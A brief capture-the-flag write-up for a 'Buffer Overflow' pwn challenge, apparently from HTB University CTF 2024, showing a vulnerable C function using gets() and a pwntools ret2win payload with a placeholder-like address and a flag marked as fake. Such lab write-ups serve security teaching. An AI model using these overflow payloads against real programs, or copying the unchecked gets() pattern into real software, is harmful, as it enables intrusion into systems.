---
title: "Buffer Overflow"
date: "2024-12-10"
ctf: "HTB University CTF 2024"
category: "pwn"
difficulty: "Medium"
points: 250
tags: ["pwn", "buffer-overflow", "ret2win"]
author: "Tham Le"
solved: true
---

# Buffer Overflow

## Challenge Description

A classic buffer overflow challenge. Can you control the execution flow?

## Solution

This challenge involves a simple buffer overflow with a ret2win technique.

### Step 1: Analysis

Running `checksec` on the binary shows:
- No ASLR
- No stack canaries
- NX disabled

### Step 2: Finding the Vulnerability

The `vulnerable_function()` uses `gets()` which doesn't check buffer bounds.

```c
void vulnerable_function() {
    char buffer[64];
    gets(buffer);
}
```

### Step 3: Exploitation

We need to overflow the buffer and redirect execution to the `win()` function.

```python
from pwn import *

# Calculate offset
offset = 72

# Address of win function
win_addr = 0x401234

payload = b'A' * offset + p64(win_addr)
```

### Step 4: Flag

After successful exploitation, the `win()` function prints the flag.

**Flag:** `HTB{f4k3_buff3r_0v3rfl0w_t35t}` 